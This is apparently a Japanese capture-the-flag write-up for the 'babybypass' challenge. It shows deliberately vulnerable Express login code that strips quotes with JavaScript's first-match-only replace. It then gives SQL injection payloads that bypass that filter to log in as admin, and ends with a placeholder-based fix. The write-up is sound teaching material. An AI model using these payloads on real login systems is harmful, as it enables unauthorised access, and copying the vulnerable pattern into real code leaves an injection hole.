# babybypass

## 問題

Can you login as admin?

```js
app.post("/login", (req, res) => {
    const username = req.body.username || "";
    const password = req.body.password || "";

    if (
        typeof username !== "string" ||
        typeof password !== "string"
    ) {
        return res.send("Invalid input");
    }

    // I removed quotes, so it must be safe!
    const query =
        `SELECT * FROM users WHERE username='${username.replace("'", "")}' AND password='${password.replace("'", "")}';`;

    db.get(query, (err, user) => {
        if (err) {
            return res.send(`SQL error: ${err.message}`);
        }

        if (!user) {
            return res.send("invalid credentials");
        }

        if (user.username === "admin") {
            return res.send(`Hello, admin! Here is your flag: ${FLAG}`);
        }

        return res.send(`Hello, ${user.username}!`);
    });
});
```

## 概要

adminユーザーでログインすることが求められていますが、パスワードはわかりません。

でも、SQLの組み立てにプレースホルダを使っていないので、SQLインジェクションできそうです。

通常このような場合、てきとーなusernameとともに、passwordに例えば
```
' or username='admin'; --
```
のように入力し、
```
SELECT * FROM users WHERE username='a' AND password='' or username='admin'; --';
```
のようなSQLを実行してもらうが定番です。

※この問題についていえば、usersテーブルにadminの1件しか入っていないので、もっと定番の`' or 1=1; --`でもよさそうですね。

しかし、この問題では入力したusernameとpasswordから`'`が削除されてしまうようです。

どうすればadminでログインできるのでしょうか？

## 方針

Javascriptのreplace関数の特性を利用する。

## 解法

Javascriptのreplace関数は、PythonやPHPとちがって最初にマッチしたものしか置換してくれません。

```py
# Python
print("abcdeababb".replace("b", "X")) # aXcdeaXaXX
```

```php
<?php
// PHP
echo str_replace("b", "X", "abcdeababb"); // aXcdeaXaXX
```

```js
// Javascript
console.log("abcdeababb".replace("b", "X")); // aXcdeababb
```

よって、passwordに
```
'' or username='admin'; --
```
のように頭に余計な`'`をつけて入力すれば、最初の`'`だけ消えるので、SQLインジェクションが成功します。

## 補足

もし本当に安全にしたいのであれば、`'`を削除するのではなく、下記のようにプレースホルダを使うべきです。
```js
const query = "SELECT * FROM users WHERE username = ? AND password = ?";

    db.get(query, [username, password], (err, user) => {
```

また、全て置換したいときはreplaceではなくreplaceAllを使います。
```js
// Javascript
console.log("abcdeababb".replaceAll("b", "X")); // aXcdeaXaXX
```
